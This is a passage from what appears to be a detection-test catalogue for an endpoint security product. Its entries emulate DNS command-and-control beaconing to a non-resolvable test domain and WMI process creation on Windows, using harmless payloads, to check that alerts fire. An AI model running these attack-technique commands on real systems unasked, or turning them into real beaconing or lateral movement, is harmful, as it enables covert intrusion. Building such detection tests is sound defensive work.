tests.command: 1..10 | ForEach-Object { Resolve-DnsName 'beacon.csp-c2-test.invalid' -ErrorAction SilentlyContinue; Start-Sleep 1 }; Write-Host '[CSP] DNS beacon pattern (10 queries @ 1s interval) emitted'
expected_signals: repeated queries to same non-existent domain

tests.name: dns_beacon_periodic_linux
tests.description: Resolve the same domain 10 times at 1s intervals on Linux.
tests.command: for i in $(seq 1 10); do dig +short beacon.csp-c2-test.invalid 2>/dev/null || nslookup beacon.csp-c2-test.invalid 2>/dev/null || true; sleep 1; done; echo '[CSP] DNS beacon pattern (10 queries @ 1s interval) emitted'

techniques.name: WMI Process Spawn (BTP)
techniques.description: WMI-based process creation is a BTP-monitored lateral movement / execution vector. Cortex XDR detects wmic/WMI spawning child processes.

tests.name: wmic_process_create
tests.description: wmic process call create — BTP detects WMI spawning a process locally.
tests.command: wmic process call create "cmd.exe /c echo CSP-WMI-BTP-test && whoami" 2>&1 & echo [CSP] wmic process create pattern emitted

tests.name: powershell_wmi_invoke
tests.description: PowerShell Invoke-WmiMethod — BTP detects scripted WMI execution.
tests.command: try { Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c echo CSP-WMI-PS-test' -ErrorAction Stop } catch { Write-Host "[CSP] WMI invoke failed (expected without admin): $_" }; Write-Host '[CSP] WMI Invoke-WmiMethod pattern emitted'
